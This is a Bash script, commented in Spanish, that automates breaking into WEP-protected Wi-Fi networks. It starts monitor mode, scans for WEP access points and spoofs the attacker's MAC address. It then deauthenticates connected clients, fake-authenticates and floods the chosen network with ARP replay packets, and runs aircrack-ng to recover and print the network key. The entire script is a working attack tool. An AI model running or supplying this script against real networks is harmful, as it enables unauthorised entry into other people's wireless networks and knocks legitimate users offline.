#!/bin/bash
# Redux supercutre de airoscript usando Arp Replay.
set -o nounset
trap clean INT TERM EXIT

verde() { echo -ne "\e[32m# $1\e[m"; }
RND="cap_$RANDOM$RANDOM"

# Esto dejará todo el patio limpio.
clean() {
    verde "Bajando adaptadores en modo monitor:\n"
    airmon-ng | sed -n 's@^\(mon[0-9]\+\).*@\1@p'| xargs -n1 airmon-ng stop | grep -v '^$'
    verde "Limpiando temporales:\n"
    rm -v $RND* replay_arp* 2>/dev/null
    verde "OK\n"
}

verde "System check!\n"
which screen airmon-ng airodump-ng aireplay-ng aircrack-ng macchanger ifconfig iwlist || exit 1

# Esto necesita poderes místicos.
[ $USER = "root" ] || exit 1

# Lanzamos wlan en modo monitor para buscar ESSIDs.
verde "Iniciamos Adaptador, escribiremos en ${RND}.*"
airmon-ng start wlan0 || exit 1
time screen -S airodump airodump-ng -w $RND mon0

# Listamos los aps bajo WEP detectados.
verde "APs detectados:\n"
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do
if [ "$PRIVACY" = " WEP " ]; then
    i=$(($i+1))
    echo -e "$i)  $MAC\t$CHANNEL\t$PRIVACY\t$POWER\t$ESSID"
    aessid[$i]=${ESSID// /}
    achannel[$i]=${CHANNEL// /}
    amac[$i]=${MAC// /}
fi
done < $RND-01.csv
[ $i -eq 0 ] && exit 1
verde "Seleccionar AP del 1 al $i:\n"
read -r choice
[ -z ${amac[$choice]} ] && exit 1

# Paso de martillear el AP con mi mac.
verde "Falseando MAC:\n"
ifconfig mon0 down
macchanger -A mon0
MYMAC=$(macchanger -s mon0 | sed -n 's/Current MAC: \([0-9a-f\:]\+\) (.*/\1/p')
verde "Ponemos la interficie monitor en el canal ${achannel[$choice]}:\n"
iwconfig mon0 channel ${achannel[$choice]}
iwlist mon0 channel

# Creamos un fichero .screenrc custom para 'splitear' aireplay/airodump en una sesión de screen.
cat > ${RND}.screenrc <<EOF
startup_message off
zombie cr
bind ^b screen -t Deauth 3 aireplay-ng -0 5 -a ${amac[$choice]} -c \$(sed -n 's@^\([0-9A-F:]\{17\}\),.*@\1@p' < $RND-02.csv | grep -iv ${amac[$choice]} | grep -iv $MYMAC) mon0
screen -t Auth   0 aireplay-ng -1 6000 -o 1 -q 10 -e ${aessid[$choice]} -a ${amac[$choice]} -h $MYMAC mon0
split
focus
screen -t Replay 1 aireplay-ng -3 -x 50 -b ${amac[$choice]} -h $MYMAC mon0
split
focus
screen -t Dump   2 airodump-ng -c ${achannel[$choice]} --bssid ${amac[$choice]} -w $RND mon0
resize +6
EOF

# Deauth
# aireplay-ng --deauth 5 -a ${amac[$choice]} -c $(sed -n 's@^\([0-9A-F:]\{17\}\),.*$@\1@p' < $RND-02.csv) mon0

# Efectuamos el ataque en si.
verde "Ataque ARP REPLAY\n"
time screen -S wepfrit -c ${RND}.screenrc

# Buscamos las clave con los IV obtenidos.
verde "Búsqueda de clave por método PTW\n"
time screen -S aircrack aircrack-ng -z -0 -f2 -b ${amac[$choice]} -l ${aessid[$choice]}.key ${RND}*.cap

# Presentamos la clave si aplica.
[ -f ${aessid[$choice]}.key ] && { verde "Clave encontrada:\n "; cat ${aessid[$choice]}.key; echo ; read; }
